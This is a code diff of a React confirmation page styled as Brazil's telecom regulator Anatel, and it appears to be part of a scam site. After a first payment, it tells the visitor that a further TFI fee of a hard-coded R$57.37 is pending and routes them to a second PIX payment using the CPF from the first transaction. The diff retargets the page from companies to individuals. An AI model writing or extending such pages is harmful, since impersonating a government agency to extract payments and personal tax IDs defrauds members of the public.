@@ -4,37 +4,36 @@ import AnatelHeader from '@/components/AnatelHeader';
 import AnatelFooter from '@/components/AnatelFooter';
 
 const fmt = (v) => new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(v || 0);
-const fmtCNPJ = (c) => {
+const fmtCPF = (c) => {
   if (!c) return 'N/A';
   const n = c.replace(/\D/g, '');
-  return n.length === 14 ? n.replace(/^(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})$/, '$1.$2.$3/$4-$5') : c;
+  return n.length === 11 ? n.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : c;
 };
 
 export default function AnatelConfirmacaoPage() {
   const navigate = useNavigate();
   const location = useLocation();
   const valor = location.state?.valor || 68.85;
-  const cnpj = location.state?.cnpj || '';
-  const dadosEmpresa = location.state?.dadosEmpresa || { nome: 'Contribuinte', cnpj };
+  const cpf = location.state?.cpf || '';
+  const dadosPessoa = location.state?.dadosPessoa || { nome: 'Contribuinte', cpf };
   const cpfUtilizado = location.state?.cpfUtilizado || null;
 
   const [mostrarTFI, setMostrarTFI] = useState(true);
-  const valorTFI = 57.37; // TFI - Taxa de Fiscalização de Instalação (sem acréscimos)
+  const valorTFI = 57.37;
 
   const dataHoje = new Date().toLocaleDateString('pt-BR', {
     day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit'
   });
 
   const pagarTFI = () => {
-    // Garantir que dadosEmpresa tem o cnpj
-    const empresaCompleta = {
-      ...dadosEmpresa,
-      cnpj: dadosEmpresa?.cnpj || cnpj
+    const pessoaCompleta = {
+      ...dadosPessoa,
+      cpf: dadosPessoa?.cpf || cpf
     };
     
     navigate('/anatel/pagamento', {
       state: {
-        dadosEmpresa: empresaCompleta,
+        dadosPessoa: pessoaCompleta,
         taxas: {
           total: valorTFI,
           taxas: [{
@@ -45,8 +44,8 @@ export default function AnatelConfirmacaoPage() {
             total_item: valorTFI
           }]
         },
-        exercicio2026: true,  // Usar isso para ir pra página final
-        cpfAnterior: cpfUtilizado  // Usar mesmo CPF da primeira transação
+        exercicio2026: true,
+        cpfAnterior: cpfUtilizado
       }
     });
   };
@@ -99,8 +98,8 @@ export default function AnatelConfirmacaoPage() {
                   <table className="w-full">
                     <tbody>
                       {[
-                        { k: 'Contribuinte', v: (dadosEmpresa?.nome || 'N/A').toUpperCase(), bold: true },
-                        { k: 'CNPJ', v: fmtCNPJ(cnpj) },
+                        { k: 'Contribuinte', v: (dadosPessoa?.nome || 'N/A').toUpperCase(), bold: true },
+                        { k: 'CPF', v: fmtCPF(cpf) },
                         { k: 'Taxa', v: 'TFF 2025' },
                         { k: 'Modalidade', v: 'Pagamento via PIX' },
                         { k: 'Data / Hora', v: dataHoje },
@@ -146,7 +145,7 @@ export default function AnatelConfirmacaoPage() {
                   </div>
                   <div style={{ border: '2px solid #071D41', borderTop: 'none' }} className="bg-white p-5">
                     <p className="text-[13px] text-gray-600 mb-4 leading-relaxed">
-                      Ainda existe uma <strong>Taxa de Fiscalização de Instalação (TFI)</strong> pendente para sua empresa. Regularize agora sem multas.
+                      Ainda existe uma <strong>Taxa de Fiscalização de Instalação (TFI)</strong> pendente. Regularize agora sem multas.
                     </p>
                     <div style={{ background: '#fff3cd', border: '1px solid #ffc107' }} className="p-4 text-center mb-4">
                       <p className="text-[10px] text-gray-600 uppercase tracking-widest mb-1">TFI 2025 - Sem acréscimos</p>
